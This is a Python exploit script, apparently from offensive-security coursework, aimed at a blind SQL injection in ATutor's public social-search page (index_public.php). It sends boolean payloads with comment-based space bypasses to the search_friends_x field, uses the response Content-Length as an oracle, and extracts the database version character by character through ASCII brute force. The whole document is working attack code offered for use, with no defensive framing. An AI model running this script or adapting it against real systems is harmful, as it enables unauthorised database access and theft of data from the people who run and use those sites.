import sys
import re
import json
import requests
from bs4 import BeautifulSoup

def searchFriends_custom(ip, inj_str):
    target = f"http://{ip}/ATutor/mods/_standard/social/index_public.php"

    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }

    myobj = {
        "rand_key": "x",
        "search_friends_x": inj_str
    }

    r = requests.post(target, headers=headers, data = myobj)
    s = BeautifulSoup(r.text, 'lxml')
    # print ("Response Headers:")
    # print (r.headers)
    # print()
    # print ("Response Content:")
    # print (s.text)
    # print ()

    content_length = int(r.headers['Content-Length'])
    print(f"Content Length: {content_length}")
    error = re.search("Invalid argument", s.text)
    if error:
        print ("Errors found in response. Possible SQL injection found")
    else:
        print ("No errors found")

def searchFriends_sqli(ip, inj_str):
    target = f"http://{ip}/ATutor/mods/_standard/social/index_public.php"

    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }

    myobj = {
        "rand_key": "x",
        "search_friends_x": inj_str
    }

    r = requests.post(target, headers=headers, data = myobj)
    s = BeautifulSoup(r.text, 'lxml')

    content_length = int(r.headers['Content-Length'])
    print(content_length)

    if content_length < 6100:
        return False 
    else:
        return True

def extract_version(ip):
    template = "test')/**/or/**/(ascii(substring((select/**/version()),<num>,1)))=<inj>#"
    
    output = "" # If we already have stuff, can start output with value and change starting i
    for i in range(1,100):
        new_character = False
        for c in range(32, 126): # ASCII letters, numbers and punctuation
            query_string = f"test')/**/or/**/(ascii(substring((select/**/version()),{i},1)))={c}#"
            res = searchFriends_sqli(ip, query_string)
            print(f"Checking {chr(c)}: {query_string} -- {res}")
            if res == True:
                new_character = True
                output += chr(c)
                print(f"Success, adding {chr(c)} -- {output}")
                break
        if not new_character:
            print("No possible characters, breaking now!")
            break
    print(f"Version: {output}")
    return output

def main():
    if len(sys.argv) != 3:
        print ("(+) usage: %s <target> <injection_string>" % sys.argv[0])
        print ('(+) eg: %s 192.168.121.103 "aaaa\'" '  % sys.argv[0])
        sys.exit(-1)

    ip                  = sys.argv[1]
    injection_string    = sys.argv[2]

    true_injection_string = "aaaa')/**/or/**/(select/**/1)=1#"
    false_injection_string = "aaaa')/**/or/**/(select/**/1)=0#"
    extract_version(ip)

    searchFriends_custom(ip, false_injection_string)
    searchFriends_custom(ip, true_injection_string)
    # print(searchFriends_sqli(ip, true_injection_string))
    # print(searchFriends_sqli(ip, false_injection_string))

if __name__ == "__main__":
    main()